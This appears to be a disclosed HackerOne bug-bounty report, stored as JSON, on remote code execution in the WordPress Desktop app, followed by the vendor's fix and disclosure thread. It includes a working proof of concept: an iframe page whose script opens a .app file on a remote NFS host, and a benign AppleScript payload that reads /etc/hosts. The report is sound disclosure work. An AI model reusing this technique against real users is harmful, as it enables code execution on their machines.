@@ -1,0 +1,526 @@
+{
+    "id": 301458,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE0NTg=",
+    "url": "https://hackerone.com/reports/301458",
+    "title": "Remote Code Execution in Wordpress Desktop",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "critical",
+    "readable_substate": "Resolved",
+    "created_at": "2017-12-31T00:08:35.763Z",
+    "submitted_at": "2017-12-31T00:08:35.763Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "mattaustin",
+        "url": "/mattaustin",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 111,
+        "url": "https://hackerone.com/automattic",
+        "handle": "automattic",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Automattic",
+            "twitter_handle": "",
+            "website": "https://automattic.com",
+            "about": "WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2018-04-14T22:09:50.511Z",
+    "bug_reporter_agreed_on_going_public_at": "2018-03-15T22:09:34.012Z",
+    "team_member_agreed_on_going_public_at": null,
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "An attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution. \n\nThis issue looks to be around this line of code: \nhttps://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38\n\nIf shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser).  If we pass the an a .app file on MacOS or an exe it will just execute the code. \n\nWe also link to a remote readable NFS mount (or windows share) to point to a remote executable. \n\nA Wordpress page is created with: \n```\n<center><iframe style=\"border: 0;\" src=\"https://maustin.net/hax/wp_desktop/index.html\" width=\"250\" height=\"250\"></iframe></center> \n```\n\nThis file has the following code: \n```\n   <script>\n      // window.open('file:///Applications/Calculator.app');\n      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')\n   </script>\n```\n\nThe file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:\n\n```\ntell application \"Terminal\"\n    do script \"cat /etc/hosts\"\n    display dialog \"You just got hacked!\"\nend tell\n\ndo shell script \"open -a Calculator\"\n```\n\n### POC\n1. Create the setup described above. \n2. Invite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the \"reader\")\n3. Code is executed when the user views the page. \n\nSee attached video for a working POC. \n\n\n### Sugested Fix: \nBefore passing a url to shell.openExternal the application should validate that it begins with http:// or https://.\n\n## Impact\n\nAn attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run. \n\nThe remote attacker would be able to run any code as the current user on the system once the page is viewed.\n\nIn my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.",
+    "weakness": {
+        "id": 70,
+        "name": "Code Injection"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 250482,
+            "file_name": "Wordpress_Desktop_RCE.mp4",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/250/482/2964012857326385065a36c3216a72744394f124/Wordpress_Desktop_RCE.mp4?response-content-disposition=attachment%3B%20filename%3D%22Wordpress_Desktop_RCE.mp4%22%3B%20filename%2A%3DUTF-8%27%27Wordpress_Desktop_RCE.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T074106Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2fdf8b4ae36a85af1eb4022600d3d75922249558ef38a2112e2b227d4fd4b8df",
+            "file_size": 464236,
+            "type": "video/mp4"
+        }
+    ],
+    "allow_singular_disclosure_at": "2018-04-14T22:09:34.127Z",
+    "allow_singular_disclosure_after": -169551092.02598777,
+    "singular_disclosure_allowed": true,
+    "vote_count": 10,
+    "voters": [
+        "jokebookservice1",
+        "foobar7",
+        "spam404",
+        "emitrani",
+        "r3y",
+        "eveeez",
+        "cr4xerbik4sh",
+        "silv3rpoision",
+        "asad_anwar",
+        "tankxxx"
+    ],
+    "severity": {
+        "rating": "critical",
+        "author_type": "User"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 2260809,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for the report, we'll take a look.",
+            "automated_response": false,
+            "created_at": "2018-01-04T00:02:44.947Z",
+            "updated_at": "2018-01-04T00:02:44.947Z",
+            "actor": {
+                "username": "vortfu",
+                "cleared": false,
+                "verified": false,
+                "url": "/vortfu",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2309264,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I am now on the 3.2.0-beta2 branch and this is still reproducible. Any updates on this issue? ",
+            "automated_response": false,
+            "created_at": "2018-01-23T08:30:23.841Z",
+            "updated_at": "2018-01-23T08:30:23.841Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2340811,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Any updates on this issue?",
+            "automated_response": false,
+            "created_at": "2018-02-01T01:19:36.227Z",
+            "updated_at": "2018-02-01T01:19:36.227Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2376251,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Any updates on this issue? Is this the correct place for this issue? ",
+            "automated_response": false,
+            "created_at": "2018-02-12T17:51:39.883Z",
+            "updated_at": "2018-02-12T17:52:02.419Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2380238,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::HackerRequestedMediation",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-02-13T21:36:20.266Z",
+            "updated_at": "2018-02-13T21:36:20.266Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2381785,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi Matt,\n\nSorry for not responding.\n\nI was able to reproduce the problem. I actually fixed the problem in https://github.com/Automattic/wp-desktop/pull/377 as part of other work, but it seems to be still pending a merge. I'll make sure this gets merged in and a new release pushed out as soon as possible.\n\nI'll comment here again when that's done",
+            "automated_response": false,
+            "created_at": "2018-02-14T09:16:00.334Z",
+            "updated_at": "2018-02-14T09:16:00.334Z",
+            "actor": {
+                "username": "allnoodles",
+                "cleared": false,
+                "verified": false,
+                "url": "/allnoodles",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2382553,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Ok, 3.2 beta 3 has been released and it fixes the issue for me. We're aiming to release fully in the next day or so, pending confirmation that it's fixed for you.",
+            "automated_response": false,
+            "created_at": "2018-02-14T14:44:34.640Z",
+            "updated_at": "2018-02-14T14:44:34.640Z",
+            "actor": {
+                "username": "allnoodles",
+                "cleared": false,
+                "verified": false,
+                "url": "/allnoodles",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2383251,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Awesome! This looks resolved to me. ",
+            "automated_response": false,
+            "created_at": "2018-02-14T17:48:09.001Z",
+            "updated_at": "2018-02-14T17:48:09.001Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2383275,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Looking at the PR, I am glad you guys are using correct \"new URL\" instead of url.parse in node as well. Looks good. ",
+            "automated_response": false,
+            "created_at": "2018-02-14T17:58:16.490Z",
+            "updated_at": "2018-02-14T17:58:16.490Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2386508,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks! I'll see about getting this wrapped up",
+            "automated_response": false,
+            "created_at": "2018-02-15T13:19:51.305Z",
+            "updated_at": "2018-02-15T13:19:51.305Z",
+            "actor": {
+                "username": "allnoodles",
+                "cleared": false,
+                "verified": false,
+                "url": "/allnoodles",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2478425,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "This looks to be fixed and live in the 3.2.0 release version. ",
+            "automated_response": false,
+            "created_at": "2018-03-10T00:08:13.178Z",
+            "updated_at": "2018-03-10T00:08:13.178Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2487582,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Hi. Yes, the fix was released in the 3.2.0 version. As mentioned above, https://github.com/Automattic/wp-desktop/pull/377 was created as a result of a previous report of yours (#293367).",
+            "automated_response": false,
+            "created_at": "2018-03-13T11:08:22.325Z",
+            "updated_at": "2018-03-13T11:08:22.325Z",
+            "actor": {
+                "username": "xknown",
+                "cleared": false,
+                "verified": false,
+                "url": "/xknown",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "mattaustin",
+                "url": "/mattaustin"
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2487584,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-03-13T11:08:37.887Z",
+            "updated_at": "2018-03-13T11:08:37.887Z",
+            "actor": {
+                "url": "/automattic",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Automattic"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "automattic",
+            "collaborator": {
+                "username": "mattaustin",
+                "url": "/mattaustin"
+            }
+        },
+        {
+            "id": 2488717,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I assume there will be no issue with public disclosure as the issue has been in public PR and known for a few months? ",
+            "automated_response": false,
+            "created_at": "2018-03-13T17:05:45.270Z",
+            "updated_at": "2018-03-13T17:05:56.369Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2497183,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-03-15T22:09:34.054Z",
+            "updated_at": "2018-03-15T22:09:34.054Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2538343,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "This issue has been public in the PR for 3 months any reason no to make it public? I would like to link to this is the CVE. ",
+            "automated_response": false,
+            "created_at": "2018-03-27T22:16:02.959Z",
+            "updated_at": "2018-03-27T22:16:02.959Z",
+            "actor": {
+                "username": "mattaustin",
+                "cleared": false,
+                "verified": false,
+                "url": "/mattaustin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/526/c9a3feb16fa81bdfb2e976598a2ff4006a59559b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        },
+        {
+            "id": 2611501,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2018-04-14T22:09:50.936Z",
+            "updated_at": "2018-04-14T22:09:50.936Z",
+            "actor": {
+                "url": "/automattic",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Automattic"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "automattic"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
